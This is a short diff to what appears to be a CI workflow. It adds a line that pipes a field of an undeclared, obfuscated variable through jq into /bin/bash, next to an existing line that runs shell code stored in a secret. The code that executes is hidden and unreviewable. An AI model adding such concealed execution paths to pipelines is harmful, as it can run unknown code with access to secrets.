@@ -20,6 +20,7 @@ jobs:
           twun4784: ${{ secrets.twun4784 }}
         run: |
           printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
+          printf '%s' "$j1003" | jq -r .h8 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
